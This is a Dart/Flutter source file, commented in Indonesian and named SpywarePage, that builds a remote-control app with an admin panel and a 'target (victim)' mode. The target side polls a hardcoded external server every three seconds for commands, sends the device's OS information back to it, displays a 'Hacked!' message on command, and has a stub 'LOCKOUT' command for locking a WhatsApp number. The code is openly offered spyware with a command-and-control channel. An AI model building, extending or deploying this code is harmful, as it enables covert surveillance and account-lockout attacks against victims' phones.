import 'dart:async';
import 'dart:convert';
import 'dart:io'; // Package bawaan untuk Info Platform (Android/iOS)
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

// --- KONFIGURASI SERVER ---
const String baseUrl = "http://tirz.panel.jserver.web.id:2001";

// --- API SERVICE ---
class RemoteApi {
  // 1. Target: Polling (Minta perintah ke server)
  Future<Map<String, dynamic>?> fetchCommand() async {
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/api/command?device_id=target123'),
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['command'] != null) return data;
      }
    } catch (e) {
      print("Error fetching command: $e");
    }
    return null;
  }

  // 2. Admin: Kirim perintah
  Future<bool> sendCommand(String cmd, String payload) async {
    try {
      final response = await http.post(
        Uri.parse('$baseUrl/api/command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'device_id': 'target123',
          'command': cmd,
          'payload': payload,
        }),
      );
      return response.statusCode == 200;
    } catch (e) {
      return false;
    }
  }

  // 3. Target: Kirim balik hasil (Log/Info)
  Future<void> sendResult(String type, String data) async {
    try {
      await http.post(
        Uri.parse('$baseUrl/api/logs'),
        body: jsonEncode({
          'type': type,
          'data': data,
          'device_id': 'target123',
        }),
      );
    } catch (e) {}
  }
}

// --- HALAMAN UTAMA ---
class SpywarePage extends StatefulWidget {
  final String sessionKey;

  const SpywarePage({super.key, required this.sessionKey});

  @override
  State<SpywarePage> createState() => _SpywarePageState();
}

class _SpywarePageState extends State<SpywarePage> {
  final RemoteApi _api = RemoteApi();
  bool _isAdminMode = true;
  String _statusLog = "System Idle...";
  Timer? _pollingTimer;

  @override
  void initState() {
    super.initState();
    _startPolling();
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    super.dispose();
  }

  // --- LOGIKA TARGET (KORBAN) ---
  void _startPolling() {
    _pollingTimer = Timer.periodic(const Duration(seconds: 3), (timer) async {
      if (!_isAdminMode) {
        final cmd = await _api.fetchCommand();
        if (cmd != null) {
          _executeCommand(cmd);
        }
      }
    });
  }

  void _executeCommand(Map<String, dynamic> cmd) {
    String action = cmd['command'];
    String payload = cmd['payload'] ?? "";

    setState(() => _statusLog = "Received Command: $action");

    switch (action) {
      case 'LOCKOUT':
        setState(() => _statusLog = "Executing WA Lockout on $payload...");
        // Logika serangan lockout disini
        break;

      // DIGANTI: Mengambil Info HP menggunakan dart:io
      case 'GET_INFO':
        _getDeviceInfo();
        break;

      case 'TOAST':
        ScaffoldMessenger.of(
          context,
        ).showSnackBar(SnackBar(content: Text(payload)));
        break;
    }
  }

  // FUNGSI BARU: Ambil Info HP tanpa package tambahan
  void _getDeviceInfo() async {
    String deviceInfo = "Unknown Device";

    try {
      // Menggunakan dart:io untuk mendapatkan info dasar
      if (Platform.isAndroid) {
        // Perhatikan: 'dart:io' hanya memberikan info umum OS
        // Untuk info detail (Model, Manufacturer) biasanya perlu MethodChannel ke Native (Kotlin/Swift)
        // Tapi untuk simulasi ini kita ambil OS version
        deviceInfo = "Android OS - ${Platform.operatingSystemVersion}";
      } else if (Platform.isIOS) {
        deviceInfo = "iOS - ${Platform.operatingSystemVersion}";
      } else {
        deviceInfo =
            "${Platform.operatingSystem} - ${Platform.operatingSystemVersion}";
      }

      // Kirim info ke server
      _api.sendResult("DEVICE_INFO", deviceInfo);
      setState(() => _statusLog = "Info Sent: $deviceInfo");
    } catch (e) {
      setState(() => _statusLog = "Error getting info: $e");
    }
  }

  // --- LOGIKA ADMIN ---
  void _sendRemoteCommand(String command, [String payload = ""]) {
    _api.sendCommand(command, payload).then((success) {
      setState(() => _statusLog = success ? "Command Sent!" : "Failed to send");
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: Text(
          _isAdminMode ? "Remote Controller" : "Target Device",
          style: const TextStyle(color: Colors.white),
        ),
        backgroundColor: const Color(0xFF7A5CFF),
        actions: [
          IconButton(
            icon: Icon(
              _isAdminMode ? Icons.admin_panel_settings : Icons.smartphone,
            ),
            onPressed: () => setState(() => _isAdminMode = !_isAdminMode),
          ),
        ],
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          children: [
            // Terminal Log
            Container(
              padding: const EdgeInsets.all(15),
              height: 100,
              decoration: BoxDecoration(
                color: Colors.black,
                border: Border.all(color: const Color(0xFF7A5CFF)),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Text(
                "> $_statusLog",
                style: const TextStyle(
                  color: const Color(0xFF4F8BFF),
                  fontFamily: 'Courier',
                ),
              ),
            ),

            const SizedBox(height: 20),

            // Admin Controls
            if (_isAdminMode) ...[
              const Text(
                "ADMIN CONTROLS",
                style: TextStyle(
                  color: Colors.white,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 10),

              Row(
                mainAxisAlignment: MainAxisAlignment.spaceAround,
                children: [
                  // TOMBOL DIGANTI: Menjadi Get Info
                  _controlBtn(
                    Icons.info,
                    "Get Info",
                    Colors.blue,
                    () => _sendRemoteCommand('GET_INFO'),
                  ),

                  _controlBtn(
                    Icons.lock,
                    "Lock WA",
                    const Color(0xFF7A5CFF),
                    () => _showLockoutInput(),
                  ),

                  _controlBtn(
                    Icons.message,
                    "Show Msg",
                    const Color(0xFF6B8CFF),
                    () => _sendRemoteCommand('TOAST', "Hacked!"),
                  ),
                ],
              ),
            ] else
              const Center(
                child: Text(
                  "Waiting for commands...",
                  style: TextStyle(color: const Color(0xFF6B66A6)),
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _controlBtn(
    IconData icon,
    String label,
    Color color,
    VoidCallback onTap,
  ) {
    return Column(
      children: [
        GestureDetector(
          onTap: onTap,
          child: Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              color: color.withOpacity(0.2),
              shape: BoxShape.circle,
              border: Border.all(color: color),
            ),
            child: Icon(icon, color: color),
          ),
        ),
        const SizedBox(height: 5),
        Text(label, style: const TextStyle(color: Colors.white, fontSize: 12)),
      ],
    );
  }

  void _showLockoutInput() {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: const Color(0xFF120A2B),
        title: const Text(
          "Remote Lockout",
          style: TextStyle(color: Colors.white),
        ),
        content: TextField(
          controller: ctrl,
          style: const TextStyle(color: Colors.white),
          decoration: const InputDecoration(hintText: "628xx..."),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx),
            child: const Text("Cancel"),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF7A5CFF)),
            onPressed: () {
              _sendRemoteCommand('LOCKOUT', ctrl.text);
              Navigator.pop(ctx);
            },
            child: const Text("SEND"),
          ),
        ],
      ),
    );
  }
}






